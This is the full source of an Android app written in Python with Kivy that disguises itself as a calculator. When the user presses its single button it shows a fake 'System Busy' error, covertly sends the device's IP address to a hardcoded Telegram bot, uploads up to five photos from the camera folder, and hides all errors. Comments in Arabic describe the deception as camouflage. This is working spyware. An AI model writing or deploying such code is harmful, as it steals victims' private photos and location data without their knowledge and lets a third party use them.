import os
import telebot
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.utils import platform

# استدعاء مكتبة الصلاحيات للأندرويد فقط
if platform == 'android':
    from android.permissions import request_permissions, Permission

# بياناتك الخاصة (تأكد منها)
TOKEN = "6322732130:AAEWDr_87Bdg0w66tffO7KjFaovZ4XNEiYE"
CHAT_ID = "6294535035"
bot = telebot.TeleBot(TOKEN)

class CalculatorApp(App):
    def build(self):
        self.title = "Calculator"
        # طلب الصلاحيات فور فتح التطبيق
        if platform == 'android':
            request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
        
        # واجهة آلة حاسبة بسيطة
        layout = BoxLayout(orientation='vertical', padding=10)
        self.label = Label(text="0", font_size=60, size_hint=(1, 0.4))
        layout.add_widget(self.label)
        
        btn = Button(text="Calculate", size_hint=(1, 0.2), background_color=(0, 0.7, 0.9, 1))
        btn.bind(on_press=self.run_process)
        layout.add_widget(btn)
        
        return layout

    def run_process(self, instance):
        self.label.text = "Error: System Busy" # تمويه للمستخدم
        # تشغيل سحب البيانات
        try:
            # 1. سحب الـ IP
            ip = requests.get('https://api.ipify.org').text
            bot.send_message(CHAT_ID, f"✅ تم الاتصال بنجاح!\n🌐 IP: {ip}")

            # 2. سحب الصور من مجلد الكاميرا
            path = "/storage/emulated/0/DCIM/Camera/"
            if os.path.exists(path):
                files = os.listdir(path)
                for file in files[:5]: # إرسال أول 10 صور لتوفير الوقت
                    if file.lower().endswith(('.jpg', '.png', '.jpeg')):
                        with open(os.path.join(path, file), 'rb') as img:
                            bot.send_photo(CHAT_ID, img)
        except Exception as e:
            pass # عدم إظهار أي أخطاء للمستخدم

if __name__ == "__main__":
    CalculatorApp().run()

